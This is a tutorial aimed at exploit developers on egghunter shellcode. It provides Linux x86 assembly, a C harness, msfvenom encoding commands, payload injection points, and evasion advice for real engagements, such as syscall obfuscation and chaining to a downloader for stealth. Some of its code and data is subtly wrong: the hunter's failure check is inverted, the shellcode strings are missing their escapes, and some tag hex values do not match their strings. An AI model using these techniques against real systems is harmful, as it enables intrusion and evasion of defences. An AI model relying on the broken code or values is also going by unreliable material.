# 🥚 Egghunting: A Definitive Guide for Hackers and Exploit Developers

---

## 📌 What is Egghunting?

**Egghunting** is a technique where a small, compact shellcode scans memory looking for a unique "egg" signature — a tag that marks the location of a **larger, full-featured payload**. Once found, the egghunter jumps to that memory region and executes it.

### 🧠 Why Use Egghunters?

- You can’t fit full shellcode in a limited buffer (e.g., 60-byte SEH exploit).
- You can inject your full payload somewhere else (e.g., env var, POST body).
- You need to **bypass memory layout uncertainty** (ASLR, heap spray).
- It enables **multi-stage payloads**, increasing stealth and flexibility.

---

## 🥚 The "Egg"

The egg is:
- 8 bytes long
- Usually composed of **two identical 4-byte sequences**
- Placed directly **before** the full payload

Example:  
```
Egg = "w00tw00t"
```

You'd prepend this to your payload like:
```
char shellcode[] = "w00tw00t" + [actual shellcode]
```

---

## 🏗 Egghunter Structure

1. **Compact code (~32–40 bytes)**
2. Loops through memory
3. Makes **readable memory** checks via system calls
4. Compares memory content to egg (e.g., `cmp [ecx], 0x74303077`)
5. If match found, jumps execution there

---

## ✍️ Writing an Egghunter: Linux x86 (access syscall)

Uses `int 0x80` with syscall 33 (access) to check memory validity.

```nasm
BITS 32
global _start

section .text
_start:
    xor ecx, ecx                    ; ECX = scanning pointer
next_page:
    or cx, 0xfff                    ; page align
    inc ecx                         ; step to next page
    push 0x21                       ; syscall number for access
    pop eax
    mov ebx, ecx
    int 0x80                        ; access(ECX, 0)
    cmp al, 0xf2                    ; AL == 0xf2 if access fails
    jne next_page
    mov eax, 0x74303077             ; 'w00t'
    mov edi, ecx
    scasd                           ; compare dword at [EDI] == 'w00t'
    jne next_page
    scasd                           ; compare next 4 bytes
    jne next_page
    jmp edi                         ; jump to shellcode
```

---

## 🔧 Testing the Egghunter (C Harness)

Inject both hunter and egg-tagged payload in the same process:

```c
char payload[] =
  "w00tw00t"
  "x31xc0x50x68..."  // real shellcode

char egghunter[] =
  "x31xc9x66x81xc9xffx0fx43..."; // assembled hunter

int main() {
  void (*exec_hunter)() = (void(*)())egghunter;
  exec_hunter();
}
```

---

## 🪟 Egghunters in Windows Exploits

Uses system calls like `NtAccessCheckAndAuditAlarm` to validate memory pages (instead of `access()`).

### Windows-compatible egghunter (from Metasploit):

```
msfvenom -p generic/egghunter -f c -e x86/shikata_ga_nai -b "x00"
```

### Integration in SEH exploits:

- Egghunter placed in SEH handler
- Full payload sprayed in heap/environment
- When exception triggers, SEH jumps to egghunter

---

## 🧪 Where to Inject the Full Payload

- Environment variables (e.g., set `EGG='w00tw00t[PAYLOAD]'`)
- POST data / HTTP headers (during buffer overflow)
- File contents (used in file format fuzzing)
- Shared memory segments
- Application config files

---

## 🧬 Advanced Techniques

### 🧭 Jmp-Call-Pop Eggloader (position-independent)
Used when you can’t rely on EIP/RIP directly.

```asm
jmp short call_shellcode
start:
    pop esi
    ; esi now points to "w00tw00t" + shellcode
    ...
call_shellcode:
    call start
    db "w00tw00t"
    db [SHELLCODE]
```

---

## 📦 Sample Shellcode Tags

| Tag        | Hex      | Comment                      |
|------------|----------|------------------------------|
| `w00tw00t` | `0x74303077` | Most common in research       |
| `b33fb33f` | `0x66333362` | Meme-friendly, less common    |
| `r3dTr3dT` | `0x54724433` | Custom red team tag           |
| `c0d3c0d3` | `0x64336430` | Hacker style                  |

Make sure tags are **non-null** and **not broken by badchars**.

---

## 🔍 Useful r2/GDB Notes for Testing

### View tag in memory

```
[0x00000000]> /w00t
[0x00000000]> px 32 @ hit_addr
```

### Set breakpoint in egghunter

```
gdb ./egghunter_test
b *0x08048000
r
```

---

## 🔐 Defensive Considerations

Egghunters are noisy:
- Constant memory access → AV/EDR triggers
- May cause segmentation faults during scanning
- Easy to signature based on syscall + loop

Use sparingly in real-world engagements, or pair with:
- Syscall obfuscation
- Memory probing throttles
- C2 stage encoding

---

## 📚 Additional Resources

- [Skape's original egghunter paper](https://www.exploit-db.com/docs/english/28476-egg-hunting.pdf)
- Metasploit payloads: `generic/egghunter`
- CTFs: Exploit Education, Vulnserver, OverTheWire

---

## 🧯 Tips & Tricks

- If exploit space is tight, encode egghunter with `x86/shikata_ga_nai`
- You can XOR the full shellcode + tag to avoid bad characters
- Use heap spraying or NOP sleds to improve tag reliability
- Always test under `strace` or `WinDbg` before live use
- Consider chaining egghunter → downloader → staged shellcode for maximum stealth

---


